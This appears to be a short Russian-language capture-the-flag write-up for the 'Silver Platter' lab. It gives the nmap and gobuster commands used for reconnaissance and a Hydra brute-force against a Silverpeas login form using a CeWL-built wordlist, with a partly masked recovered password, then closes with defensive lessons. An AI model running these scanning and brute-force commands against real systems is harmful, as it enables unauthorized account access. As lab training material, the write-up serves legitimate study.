# Silver Platter

**Сложность:** Easy
**Техники:** энумерация vhost/CMS · брут входа Silverpeas (Hydra + словарь CeWL)

## Разведка
```bash
nmap -sS -Pn -p- -T4 -A -oN scan.nmap <ip>
```
```
22/tcp   open  ssh   OpenSSH 8.9p1
80/tcp   open  http  nginx 1.18.0   → "Hack Smarter Security"
8080/tcp open  http  (за ним Silverpeas)
```

## Энумерация
```bash
gobuster dir -u http://<ip>/     -w .../common.txt -x js,txt,html
gobuster dir -u http://<ip>:8080 -w .../common.txt -x php,html,txt
#   console → /noredirect.html ; website → /website/
```
Хосты в `/etc/hosts`: `silverpeas.thm`, `scr1ptkiddy.thm`. Приложение — **Silverpeas** на `http://silverpeas.thm:8080/silverpeas/defaultLogin.jsp`. На главной/блоге засветился ник `scr1ptkiddy`.

## Эксплуатация — точечный брут
Словарь из контента сайта (CeWL) + Hydra по форме Silverpeas:
```bash
cewl http://silverplatter.thm > passwords.txt
hydra -l scr1ptkiddy -P passwords.txt silverplatter.thm -s 8080 \
  http-post-form "/silverpeas/AuthenticationServlet:Login=^USER^&Password=^PASS^&DomainId=0:F=Login or password incorrect"
# login: scr1ptkiddy  password: adipi****
```
Валидные учётки → вход в Silverpeas; дальше цепочка ведёт к раскрытию учёток в сообщениях и к шеллу (foothold → SSH).

## Выводы
- Словари из контента сайта (CeWL) бьют точнее обычных для логинов конкретного приложения.
- Засвеченные имена + слабые пароли = foothold Hydra; нужны блокировки и сильные пароли (ровно это ловит правило брута VPN-портала в SOC-лабе).
